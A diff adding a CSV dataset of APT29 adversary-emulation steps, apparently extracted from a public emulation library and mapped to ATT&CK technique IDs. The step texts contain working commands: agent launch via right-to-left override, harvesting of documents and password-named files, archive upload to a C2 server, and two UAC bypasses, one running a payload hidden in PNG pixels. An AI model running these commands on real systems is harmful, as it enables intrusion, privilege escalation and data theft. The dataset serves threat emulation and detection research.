@@ -1,0 +1,1101 @@
+﻿org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
+apt29,apt29,unknown,apt29::1,1,RTLO Start Sandcat,"id: 571845f6-b75c-4b9d-a666-a78f7827261f | name: RTLO Start Sandcat | description: Perform RTLO technique with SANDCAT | tactic: execution | technique: attack_id: T1036.002 | name: Masquerading: Right-to-Left Override | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2019/10/15163405/CosmicDuke.pdf | procedure_group: procedure_execution | procedure_step: 1.A | platforms: windows: psh,pwsh: command: Sleep 3;
+$bin = Get-ChildItem *cod*scr*;
+$arguments = '-server ""#{server}"" -group ""rtlo_group""';
+start-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments;
+
+if ($?) {
+  write-host ""Successfully completed RTLO execution. A new agent should appear"";
+  exit 0;
+
+} else {
+  write-host ""Failure of RTLO execution."";
+  exit 1;
+}
+ | payloads: cod.3aka3.scr | input_arguments: server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Sleep 3;
+$bin = Get-ChildItem *cod*scr*;
+$arguments = '-server ""#{server}"" -group ""rtlo_group""';
+start-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments;
+
+if ($?) {
+  write-host ""Successfully completed RTLO execution. A new agent should appear"";
+  exit 0;
+
+} else {
+  write-host ""Failure of RTLO execution."";
+  exit 1;
+}
+","[""T1036.002""]","[""T1036""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::2,2,Masquerading: Right-to-Left Override,attack_id: T1036.002 | name: Masquerading: Right-to-Left Override,"[""T1036.002""]","[""T1036""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::3,3,PowerShell,"id: a5daa530-c640-49bc-aa54-6808789a684a | name: PowerShell | description: Spawn powershell.exe from cmd.exe | tactic: execution | technique: attack_id: T1059.001 | name: Command and Scripting Interpreter: PowerShell | cti_source: https://securelist.com/the-cozyduke-apt/69731/ | procedure_group: procedure_execution | procedure_step: 1.B | platforms: windows: cmd: command: powershell.exe;
+if ($?) {
+  write-host ""[*] PowerShell successfully spawned"";
+  exit 0;
+}
+ | executors: name: command_prompt | command: powershell.exe;
+if ($?) {
+  write-host ""[*] PowerShell successfully spawned"";
+  exit 0;
+}
+","[""T1059.001""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::4,4,Command and Scripting Interpreter: PowerShell,attack_id: T1059.001 | name: Command and Scripting Interpreter: PowerShell,"[""T1059.001""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::5,5,Automated Collection,"id: 5692da31-3586-4e4f-8f07-5750070c730b | name: Automated Collection | description: Execute PowerShell from cmd.exe to collect and compress files of specific extensions. | tactic: collection | technique: attack_id: T1119 | name: Automated Collection | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_collection | procedure_step: 2.A.1 | platforms: windows: psh,pwsh: command: $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
+ | executors: name: powershell | command: $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
+","[""T1119""]","[""T1119""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::6,6,Automated Collection,attack_id: T1119 | name: Automated Collection,"[""T1119""]","[""T1119""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::7,7,System Network Configuration Discovery,"id: ee08a427-1e1d-4d8a-aeb1-978a7fcf9087 | name: System Network Configuration Discovery | description: The ipconfig utility is executed via cmd to enumerate local TCP/IP network configuration information. | tactic: discovery | technique: attack_id: T1016 | name: System Network Configuration Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.A.2 | platforms: windows: cmd: command: ipconfig /all
+ | executors: name: command_prompt | command: ipconfig /all
+","[""T1016""]","[""T1016""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::8,8,System Network Configuration Discovery,attack_id: T1016 | name: System Network Configuration Discovery,"[""T1016""]","[""T1016""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::9,9,System Network Configuration Discovery,"id: 64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce | name: System Network Configuration Discovery | description: The arp utility is executed via cmd to enumerate local ARP configuration information. | tactic: discovery | technique: attack_id: T1016 | name: System Network Configuration Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.A.3 | platforms: windows: cmd: command: arp -a
+ | executors: name: command_prompt | command: arp -a
+","[""T1016""]","[""T1016""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::10,10,System Network Configuration Discovery,attack_id: T1016 | name: System Network Configuration Discovery,"[""T1016""]","[""T1016""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::11,11,System Owner / User Discovery,"id: 35d95b64-c1f8-4ac7-a2f2-8959218239cd | name: System Owner / User Discovery | description: The native echo command is executed via cmd to enumerate local environment variables associated with current user and domain. | tactic: discovery | technique: attack_id: T1033 | name: System Owner/User Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.B.1 | platforms: windows: cmd: command: echo %USERDOMAIN%\%USERNAME%
+ | executors: name: command_prompt | command: echo %USERDOMAIN%\%USERNAME%
+","[""T1033""]","[""T1033""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::12,12,System Owner/User Discovery,attack_id: T1033 | name: System Owner/User Discovery,"[""T1033""]","[""T1033""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::13,13,Data from staged fileand Exfiltration over C2 Channel,"id: 68e209dd-f354-4adc-8bc6-e85a3e55a7f4 | name: Data from staged fileand Exfiltration over C2 Channel | description: Copy a target file from a remote file share through the existing C2 channel | tactic: exfiltration | technique: attack_id: T1041 | name: Exfiltration Over Command and Control Channel | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_exfiltration | procedure_step: 2.B.2 | platforms: windows: psh,pwsh: command: Import-Module .\upload.ps1 -Verbose -Force;
+Invoke-MultipartFormDataUpload -InFile ""C:\Users\#{profile_user}\AppData\Roaming\Draft.zip"" -Uri ""#{server}/file/upload"";
+ | payloads: upload.ps1 | input_arguments: profile_user: description: Name of profile user | type: string | default: Administrator | server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Import-Module .\upload.ps1 -Verbose -Force;
+Invoke-MultipartFormDataUpload -InFile ""C:\Users\#{profile_user}\AppData\Roaming\Draft.zip"" -Uri ""#{server}/file/upload"";
+","[""T1041""]","[""T1041""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::14,14,Exfiltration Over Command and Control Channel,attack_id: T1041 | name: Exfiltration Over Command and Control Channel,"[""T1041""]","[""T1041""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::15,15,Process Discovery,"id: 5df12481-9d8c-4235-b550-9cefc8ed7361 | name: Process Discovery | description: API call(s) are executed to enumerate local running processes. | tactic: discovery | technique: attack_id: T1057 | name: Process Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.C.1 | platforms: windows: psh,pwsh: command: Import-Module .\ps.ps1 -Verbose -Force;
+ProcessList
+ | payloads: ps.ps1 | executors: name: powershell | command: Import-Module .\ps.ps1 -Verbose -Force;
+ProcessList
+","[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::16,16,Process Discovery,attack_id: T1057 | name: Process Discovery,"[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::17,17,Process Discovery,"id: 41610306-087c-4c34-874b-37b8ed633a36 | name: Process Discovery | description: The tasklist utility is executed via cmd to enumerate local running processes. | tactic: discovery | technique: attack_id: T1057 | name: Process Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.C.2 | platforms: windows: cmd: command: tasklist /v
+ | executors: name: command_prompt | command: tasklist /v
+","[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::18,18,Process Discovery,attack_id: T1057 | name: Process Discovery,"[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::19,19,System Service Discovery,"id: 2ff877b4-0c00-401e-9d3f-070c70b610df | name: System Service Discovery | description: The sc utility is executed via cmd to enumerate local active services. | tactic: discovery | technique: attack_id: T1007 | name: System Service Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.D.1 | platforms: windows: cmd: command: sc query
+ | executors: name: command_prompt | command: sc query
+","[""T1007""]","[""T1007""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::20,20,System Service Discovery,attack_id: T1007 | name: System Service Discovery,"[""T1007""]","[""T1007""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::21,21,System Service Discovery,"id: 144b1384-5060-494f-80eb-91772695cdf3 | name: System Service Discovery | description: The net utility is executed via cmd to enumerate local active services. | tactic: discovery | technique: attack_id: T1007 | name: System Service Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.D.2 | platforms: windows: cmd: command: net start
+ | executors: name: command_prompt | command: net start
+","[""T1007""]","[""T1007""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::22,22,System Service Discovery,attack_id: T1007 | name: System Service Discovery,"[""T1007""]","[""T1007""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::23,23,System Information Discovery,"id: d2ea2676-7f85-4228-b980-ab3c0e1adc03 | name: System Information Discovery | description: The systeminfo utility is executed via cmd to enumerate local operating system configuration. | tactic: discovery | technique: attack_id: T1082 | name: System Information Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.E.1 | platforms: windows: cmd: command: systeminfo
+ | executors: name: command_prompt | command: systeminfo
+","[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::24,24,System Information Discovery,attack_id: T1082 | name: System Information Discovery,"[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::25,25,System Information Discovery,"id: 7c2a6e5b-1adb-464f-a581-4677391f8dd6 | name: System Information Discovery | description: The net utility is executed via cmd to enumerate local operating system configuration. | tactic: discovery | technique: attack_id: T1082 | name: System Information Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.E.2 | platforms: windows: cmd: command: net config workstation
+ | executors: name: command_prompt | command: net config workstation
+","[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::26,26,System Information Discovery,attack_id: T1082 | name: System Information Discovery,"[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::27,27,Permissions Groups Discovery,"id: faa96e7f-081a-40b7-a743-a6a7f2627ea3 | name: Permissions Groups Discovery | description: The net utility is executed via cmd to enumerate members of the local system's administrators group. | tactic: discovery | technique: attack_id: T1069 | name: Permission Groups Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.F.1 | platforms: windows: cmd: command: net localgroup administrators
+ | executors: name: command_prompt | command: net localgroup administrators
+","[""T1069""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::28,28,Permission Groups Discovery,attack_id: T1069 | name: Permission Groups Discovery,"[""T1069""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::29,29,Permissions Groups Discovery,"id: 26181249-be75-41ed-9fe7-5c30ea8c2d4d | name: Permissions Groups Discovery | description: The net utility is executed via cmd to enumerate members of the domain controller’s administrators group. | tactic: discovery | technique: attack_id: T1069 | name: Permission Groups Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.F.2 | platforms: windows: cmd: command: net localgroup administrators /domain
+ | executors: name: command_prompt | command: net localgroup administrators /domain
+","[""T1069""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::30,30,Permission Groups Discovery,attack_id: T1069 | name: Permission Groups Discovery,"[""T1069""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::31,31,Permissions Groups Discovery,"id: 84377d7a-0363-44fd-a082-44657ca1858f | name: Permissions Groups Discovery | description: The net utility is executed via cmd to enumerate members of the domain administrators group. | tactic: discovery | technique: attack_id: T1069 | name: Permission Groups Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.F.3 | platforms: windows: psh,pwsh: command: cmd.exe /c net group ""Domain Admins"" /domain
+ | executors: name: powershell | command: cmd.exe /c net group ""Domain Admins"" /domain
+","[""T1069""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::32,32,Permission Groups Discovery,attack_id: T1069 | name: Permission Groups Discovery,"[""T1069""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::33,33,Account Discovery,"id: 61221fb9-cb32-46d5-98fd-90567a621526 | name: Account Discovery | description: The net utility is executed via cmd to enumerate domain user accounts. | tactic: discovery | technique: attack_id: T1087 | name: Account Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.G.1 | platforms: windows: cmd: command: net user /domain
+ | executors: name: command_prompt | command: net user /domain
+","[""T1087""]","[""T1087""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::34,34,Account Discovery,attack_id: T1087 | name: Account Discovery,"[""T1087""]","[""T1087""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::35,35,Account Discovery,"id: 9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76 | name: Account Discovery | description: The net utility is executed via cmd to enumerate detailed information about a specific user account. | tactic: discovery | technique: attack_id: T1087 | name: Account Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.G.2 | platforms: windows: cmd: command: net user %USERNAME% /domain
+ | executors: name: command_prompt | command: net user %USERNAME% /domain
+","[""T1087""]","[""T1087""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::36,36,Account Discovery,attack_id: T1087 | name: Account Discovery,"[""T1087""]","[""T1087""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::37,37,Query Registry,"id: 5c23f638-9cfc-4fc4-9cab-4af628fef70a | name: Query Registry | description: The reg utility is executed via cmd to enumerate a specific Registry key associated with local system policies to ensure that the user will not be prompted for credentials when elevating permissions. | tactic: discovery | technique: attack_id: T1012 | name: Query Registry | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.H.1 | platforms: windows: cmd: command: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+ | executors: name: command_prompt | command: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+","[""T1012""]","[""T1012""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::38,38,Query Registry,attack_id: T1012 | name: Query Registry,"[""T1012""]","[""T1012""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::39,39,Staging monkey PNG,"id: 68b588bc-002a-42dc-bac7-9189f944065b | name: Staging monkey PNG | description: Staging PNG for Lateral Movement | tactic: defensive-evasion | technique: attack_id: T1036.005 | name: Masquerading: Match Legitimate Name or Location | cti_source: https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016 | procedure_group: procedure_def_evasion | procedure_step: 3.A.1 | platforms: windows: psh,pwsh: command: $username=""#{profile_user}"";
+if ( $(test-path -path ""C:\Users\$username\Downloads\monkey.png"") -eq $false ) {
+  copy-item monkey.png -Destination ""C:\Users\$username\Downloads\\"" -Force;
+  if ($? -eq $True) {
+    write-host ""[+] Successfully copied monkey.png!"";
+    get-childitem -path ""C:\Users\$username\Downloads\\"";
+    exit 0;
+  } else {
+    write-host ""[+] Failed to copy monkey.png."";
+    exit 1;
+  }
+
+  } else {
+    write-host ""[*] monkey.png already exists within C:\users\$username\Downloads...""
+  }
+ | payloads: monkey.png | input_arguments: profile_user: description: Name of profile user | type: string | default: Administrator | executors: name: powershell | command: $username=""#{profile_user}"";
+if ( $(test-path -path ""C:\Users\$username\Downloads\monkey.png"") -eq $false ) {
+  copy-item monkey.png -Destination ""C:\Users\$username\Downloads\\"" -Force;
+  if ($? -eq $True) {
+    write-host ""[+] Successfully copied monkey.png!"";
+    get-childitem -path ""C:\Users\$username\Downloads\\"";
+    exit 0;
+  } else {
+    write-host ""[+] Failed to copy monkey.png."";
+    exit 1;
+  }
+","[""T1036.005""]","[""T1036""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::40,40,Masquerading: Match Legitimate Name or Location,attack_id: T1036.005 | name: Masquerading: Match Legitimate Name or Location,"[""T1036.005""]","[""T1036""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::41,41,Bypass User Account Control,"id: 1345bff7-6f26-43b2-a92a-9aabccdb3db0 | name: Bypass User Account Control | description: A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality. | tactic: privilege-escalation | technique: attack_id: T1134.001 | name: Access Token Manipulation: Token Impersonation/Theft | cti_source: https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016 | procedure_group: procedure_privesc | procedure_step: 3.A.2 | platforms: windows: psh,pwsh: command: Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
+Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""Import-Module $env:APPDATA\update.ps1;update('#{server}')""));
+Invoke-BypassUACTokenManipulation -Arguments ""-nop -exec bypass -EncodedCommand $pcode"" -Verbose
+ | payloads: update.ps1 | Invoke-BypassUACTokenManipulation.ps1 | input_arguments: server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
+Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""Import-Module $env:APPDATA\update.ps1;update('#{server}')""));
+Invoke-BypassUACTokenManipulation -Arguments ""-nop -exec bypass -EncodedCommand $pcode"" -Verbose
+","[""T1134.001""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::42,42,Access Token Manipulation: Token Impersonation/Theft,attack_id: T1134.001 | name: Access Token Manipulation: Token Impersonation/Theft,"[""T1134.001""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::43,43,UAC Bypass via Backup Utility,"id: 89e9dffa-8836-4672-8cf3-bebd006d2a2b | name: UAC Bypass via Backup Utility | description: Modify registry values of sdclt to bypass UAC | tactic: privilege-escalation | technique: attack_id: T1548.002 | name: Abuse Elevation Control Mechanism: Bypass User Account Control | cti_source: https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016 | procedure_group: procedure_privesc | procedure_step: 3.A.3 | platforms: windows: psh,pwsh: command: if (!(test-path -path $env:windir\system32\sdclt.exe)) {
+  write-host ""[!] sdclt.exe was not found on this host."";
+  exit 1;
+}
+New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
+New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
+New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
+New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;
+
+$username=""#{profile_user}"";
+$payload='powershell.exe -noni -noexit -ep bypass -window hidden -c ""sal a New-Object;Add-Type -AssemblyName ""System.Drawing""; $g=a System.Drawing.Bitmap(""C:\Users\$($username)\Downloads\monkey.png"");$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))""';
+
+Set-ItemProperty -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""(Default)"" -Value $payload -Force;
+Set-ItemProperty -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force;
+
+cmd.exe /c sdclt.exe;
+cmd.exe /c powershell.exe;
+ | input_arguments: profile_user: description: Name of profile user | type: string | default: Administrator | executors: name: powershell | command: if (!(test-path -path $env:windir\system32\sdclt.exe)) {
+  write-host ""[!] sdclt.exe was not found on this host."";
+  exit 1;
+}
+New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
+New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
+New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
+New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;
+
+$username=""#{profile_user}"";
+$payload='powershell.exe -noni -noexit -ep bypass -window hidden -c ""sal a New-Object;Add-Type -AssemblyName ""System.Drawing""; $g=a System.Drawing.Bitmap(""C:\Users\$($username)\Downloads\monkey.png"");$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))""';
+
+Set-ItemProperty -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""(Default)"" -Value $payload -Force;
+Set-ItemProperty -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force;
+
+cmd.exe /c sdclt.exe;
+cmd.exe /c powershell.exe;
+","[""T1548.002""]","[""T1548""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
